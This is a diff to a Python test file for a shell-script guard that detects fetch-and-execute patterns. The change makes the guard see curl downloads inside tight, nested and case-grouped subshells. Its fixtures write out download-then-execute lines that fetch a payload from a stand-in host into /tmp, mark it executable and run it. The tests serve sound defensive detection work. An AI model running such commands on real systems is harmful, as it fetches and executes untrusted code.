@@ -975,18 +975,34 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                               'curl -sfL https://example.test/p -o "$DEST"\n'),
                       ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))
 
-    # A subshell written tight: the reader has no paren grammar, so `(curl`
-    # is one word and the fetch at its head is unseen; the spaced spelling is
-    # read. KEPT -- closing it is a grouping model the flat reader lacks.
-    def test_a_fetch_at_the_head_of_a_tight_subshell_is_unseen(self):
+    # Grouping parentheses are read with or without surrounding whitespace.
+    def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
         tight = "(curl -sfL https://example.test/payload -o /tmp/payload || true)\n"
-        self.assertEqual([], wg.fetches(tight))
-        self.accepted(("get", tight), ("run", "chmod +x /tmp/payload\n"))
+        self.assertEqual(1, len(wg.fetches(tight)), wg.fetches(tight))
+        self.flagged(("get", tight), ("run", "chmod +x /tmp/payload\n"))
 
     def test_the_same_subshell_with_a_space_is_read(self):
         spaced = "( curl -sfL https://example.test/payload -o /tmp/payload || true )\n"
         self.assertEqual(1, len(wg.fetches(spaced)), wg.fetches(spaced))
         self.flagged(("get", spaced), ("run", "chmod +x /tmp/payload\n"))
+
+    def test_nested_grouping_and_case_alternatives_keep_the_fetch(self):
+        for script in (
+                "( (curl -sfL https://example.test/payload -o /tmp/payload))\n",
+                "(case x in x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac)\n",
+                "case x in (x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac\n"):
+            with self.subTest(script=script):
+                self.assertEqual(1, len(wg.fetches(script)))
+                self.flagged(("get", script), ("run", "chmod +x /tmp/payload\n"))
+
+    def test_quoted_and_escaped_parentheses_stay_literal(self):
+        for script in ('echo "(curl -sfL https://example.test/x)"\n',
+                       r'\(curl -sfL https://example.test/x\)' + '\n'):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.fetches(script))
+        fetch = wg.fetches('(curl -sfL "https://example.test/(payload)" -o /tmp/payload)')[0]
+        self.assertEqual(fetch.url, "https://example.test/(payload)")
+        self.assertEqual(fetch.dest, "/tmp/payload")
 
     # 3. what runs inside a container. CLOSED for the shape the fleet can
     # reach -- a bind mount and an interpreter operand -- because the reader
